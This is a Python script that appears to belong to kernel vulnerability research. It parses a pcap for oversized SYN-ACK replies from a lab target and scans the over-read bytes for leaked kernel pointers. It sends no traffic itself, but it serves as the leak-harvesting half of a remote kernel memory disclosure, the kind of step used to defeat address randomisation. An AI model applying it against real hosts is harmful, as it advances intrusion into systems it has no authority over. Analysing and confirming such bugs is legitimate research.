#!/usr/bin/env python3
"""pcap_leak.py - scan a tcpdump pcap for over-read SYN-ACKs and kernel pointers.

The remote over-read SYN-ACK is sent from the target (192.168.89.2) to the
main-flow source.  A normal RR SYN-ACK is tot_len 100; an over-read reply is
larger (60 + optlen).  For every such packet, print the IP/TCP geometry and
scan the bytes (and, for the saved_syn geometry, the predicted neighbour
offsets) for canonical kernel pointers.

Usage: pcap_leak.py <file.pcap> [target_ip]
"""
import struct
import sys

RANGES = (
    (0xFFFF800000000000, 0xFFFFC87FFFFFFFFF, "direct-map"),
    (0xFFFFC90000000000, 0xFFFFE8FFFFFFFFFF, "vmalloc"),
    (0xFFFFFFFF80000000, 0xFFFFFFFFFFFFFFFF, "text/data"),
)

TARGET = "192.168.89.2"


def kind(v):
    for lo, hi, n in RANGES:
        if lo <= v <= hi:
            return n
    return None


def ipstr(b):
    return ".".join(str(x) for x in b)


def scan(buf, tag):
    hits = []
    for off in range(0, len(buf) - 7, 1):
        v = int.from_bytes(buf[off:off + 8], "little")
        k = kind(v)
        if k:
            hits.append((off, v, k))
    for off, v, k in hits:
        print(f"    PTR {tag}+{off:#05x} {v:#018x} ({k})")
    return hits


def main(path, target=TARGET):
    data = open(path, "rb").read()
    magic = data[:4]
    if magic not in (b"\xd4\xc3\xb2\xa1", b"\xa1\xb2\xc3\xd4",
                     b"\x4d\x3c\xb2\xa1", b"\xa1\xb2\x3c\x4d"):
        print("not a classic pcap", file=sys.stderr)
        return 2
    le = magic in (b"\xd4\xc3\xb2\xa1", b"\x4d\x3c\xb2\xa1")
    e = "<" if le else ">"
    linktype = struct.unpack_from(e + "I", data, 20)[0]
    off = 24
    n = over = 0
    total_hits = 0
    while off + 16 <= len(data):
        _ts, _tu, incl, _orig = struct.unpack_from(e + "IIII", data, off)
        off += 16
        pkt = data[off:off + incl]
        off += incl
        n += 1
        if linktype == 1:
            pkt = pkt[14:]
        elif linktype == 113:
            pkt = pkt[16:]
        if len(pkt) < 20 or (pkt[0] >> 4) != 4:
            continue
        ihl = (pkt[0] & 0xF) * 4
        tot = struct.unpack_from("!H", pkt, 2)[0]
        if pkt[9] != 6:
            continue
        src = ipstr(pkt[12:16])
        if src != target:
            continue
        dst = ipstr(pkt[16:20])
        sport, dport = struct.unpack_from("!HH", pkt, ihl)
        if tot <= 100:
            continue
        over += 1
        print(f"--- over-read #{over}: tot={tot} ihl={ihl} "
              f"{src}:{sport} -> {dst}:{dport} cap={len(pkt)}")
        # bytes copied from opt->__data start at pkt[20]
        copied = pkt[20:]
        print(f"    copy[0:48]: {copied[:48].hex(' ')}")
        # saved_syn geometry (slot 96): neighbour starts at copy offset 64
        if len(copied) >= 64:
            nb = copied[64:64 + 64]
            print(f"    neighbour:  {nb.hex(' ')}")
            total_hits += len(scan(nb, "nb"))
        total_hits += len(scan(copied, "copy"))
    print(f"== packets={n} over-read={over} ptr_hits={total_hits}")
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv[1], sys.argv[2] if len(sys.argv) > 2 else TARGET))
